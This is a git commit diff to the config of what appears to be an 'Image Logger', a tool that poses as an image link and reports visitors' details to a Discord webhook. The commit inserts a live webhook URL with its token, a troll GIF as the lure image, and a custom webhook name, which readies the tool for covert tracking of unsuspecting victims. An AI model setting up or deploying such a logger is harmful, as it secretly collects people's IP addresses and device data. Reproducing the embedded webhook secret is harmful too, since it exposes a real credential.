7c68e563244fa54c8ff151c82a9d05037e7c22d0
laggerlog <matassuvalskas491@gmail.com>
2025-06-13 19:48:44 +0100

    Update main.py

--- main.py
+++ main.py
@@ -12,13 +12,13 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1383154637548421140/Fo_ACOuaMVuVUj9KIfgW-keJDyAjxeZzIDvRhLLNXxRpHsdajJXyNB4kcc1eeNjFqVSr",
+    "image": "https://tenor.com/en-GB/view/tgroll-trollge-gif-5952671324134299572", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "yaaa", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
